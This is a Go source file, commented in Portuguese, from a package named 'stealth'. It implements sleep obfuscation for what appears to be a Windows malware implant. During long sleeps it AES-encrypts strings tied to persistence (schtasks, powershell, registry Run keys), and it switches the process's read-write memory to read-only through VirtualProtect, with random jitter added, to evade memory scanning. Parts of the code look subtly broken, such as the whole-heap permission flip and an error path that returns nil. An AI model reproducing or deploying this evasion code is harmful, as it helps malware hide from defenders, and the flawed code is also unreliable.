package stealth

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/sha256"
	"io"
	"runtime"
	"sync"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
)

var (
	sleepMutex    sync.Mutex
	encryptionKey []byte
)

func init() {
	// Gerar chave de criptografia única por sessão
	encryptionKey = make([]byte, 32)
	rand.Read(encryptionKey)
}

// ObfuscatedSleep realiza sleep com criptografia de memória
// Técnica avançada para evitar memory scanning durante períodos de inatividade
func ObfuscatedSleep(duration time.Duration) {
	sleepMutex.Lock()
	defer sleepMutex.Unlock()

	// 1. Forçar garbage collection para limpar dados sensíveis
	runtime.GC()

	// 2. Criptografar regiões sensíveis da memória
	// (Em Go, isso é limitado, mas podemos ofuscar variáveis globais)
	encryptGlobalState()

	// 3. Alterar permissões de memória para Read-Only (Windows API)
	protectMemoryRegions(true)

	// 4. Dormir por duração especificada
	time.Sleep(duration)

	// 5. Restaurar permissões de memória
	protectMemoryRegions(false)

	// 6. Descriptografar estado global
	decryptGlobalState()
}

// encryptGlobalState criptografa variáveis globais sensíveis
func encryptGlobalState() {
	// Criptografar strings ofuscadas (double encryption)
	encryptBuffer(&obfStr_schtasks)
	encryptBuffer(&obfStr_powershell)
	encryptBuffer(&obfStr_regRun)
	encryptBuffer(&obfStr_globalPrefix)
}

// decryptGlobalState descriptografa variáveis globais
func decryptGlobalState() {
	decryptBuffer(&obfStr_schtasks)
	decryptBuffer(&obfStr_powershell)
	decryptBuffer(&obfStr_regRun)
	decryptBuffer(&obfStr_globalPrefix)
}

// encryptBuffer criptografa um buffer de string
func encryptBuffer(data *string) {
	if data == nil || *data == "" {
		return
	}

	plaintext := []byte(*data)
	ciphertext, err := encryptAES(plaintext, encryptionKey)
	if err != nil {
		return
	}

	*data = string(ciphertext)
}

// decryptBuffer descriptografa um buffer de string
func decryptBuffer(data *string) {
	if data == nil || *data == "" {
		return
	}

	ciphertext := []byte(*data)
	plaintext, err := decryptAES(ciphertext, encryptionKey)
	if err != nil {
		return
	}

	*data = string(plaintext)
}

// encryptAES criptografa dados usando AES-256-GCM
func encryptAES(plaintext, key []byte) ([]byte, error) {
	// Criar hash SHA-256 da chave para garantir tamanho correto
	hash := sha256.Sum256(key)

	block, err := aes.NewCipher(hash[:])
	if err != nil {
		return nil, err
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}

	nonce := make([]byte, gcm.NonceSize())
	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
		return nil, err
	}

	ciphertext := gcm.Seal(nonce, nonce, plaintext, nil)
	return ciphertext, nil
}

// decryptAES descriptografa dados usando AES-256-GCM
func decryptAES(ciphertext, key []byte) ([]byte, error) {
	hash := sha256.Sum256(key)

	block, err := aes.NewCipher(hash[:])
	if err != nil {
		return nil, err
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}

	nonceSize := gcm.NonceSize()
	if len(ciphertext) < nonceSize {
		return nil, err
	}

	nonce, ciphertext := ciphertext[:nonceSize], ciphertext[nonceSize:]
	plaintext, err := gcm.Open(nil, nonce, ciphertext, nil)
	if err != nil {
		return nil, err
	}

	return plaintext, nil
}

// protectMemoryRegions altera permissões de regiões de memória
func protectMemoryRegions(readOnly bool) {
	// Em Go, não temos controle direto sobre regiões de memória como em C
	// Mas podemos usar VirtualProtect para proteger o heap

	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	virtualProtect := kernel32.NewProc("VirtualProtect")

	// Obter informações sobre a memória do processo
	var memInfo windows.MemoryBasicInformation
	baseAddress := uintptr(0)

	for {
		err := windows.VirtualQuery(
			baseAddress,
			&memInfo,
			unsafe.Sizeof(memInfo),
		)

		if err != nil {
			break
		}

		// Se a região é RW (Read-Write), alterar para RO (Read-Only)
		if memInfo.State == windows.MEM_COMMIT {
			var oldProtect uint32

			if readOnly {
				// Tornar Read-Only
				if memInfo.Protect == windows.PAGE_READWRITE {
					virtualProtect.Call(
						memInfo.BaseAddress,
						memInfo.RegionSize,
						uintptr(windows.PAGE_READONLY),
						uintptr(unsafe.Pointer(&oldProtect)),
					)
				}
			} else {
				// Restaurar para Read-Write
				if memInfo.Protect == windows.PAGE_READONLY {
					virtualProtect.Call(
						memInfo.BaseAddress,
						memInfo.RegionSize,
						uintptr(windows.PAGE_READWRITE),
						uintptr(unsafe.Pointer(&oldProtect)),
					)
				}
			}
		}

		baseAddress += memInfo.RegionSize
	}
}

// SleepWithMemoryEncryption é um wrapper público para ObfuscatedSleep
func SleepWithMemoryEncryption(duration time.Duration) {
	ObfuscatedSleep(duration)
}

// SecureSleep realiza sleep com múltiplas camadas de proteção
func SecureSleep(baseMs int64) {
	// 1. Adicionar jitter
	jitter := randomInt(baseMs / 2)
	totalDuration := time.Duration(baseMs+jitter) * time.Millisecond

	// 2. Se sleep > 5 segundos, usar obfuscação de memória
	if totalDuration > 5*time.Second {
		ObfuscatedSleep(totalDuration)
	} else {
		// Sleep curto, não compensa overhead de criptografia
		time.Sleep(totalDuration)
	}
}
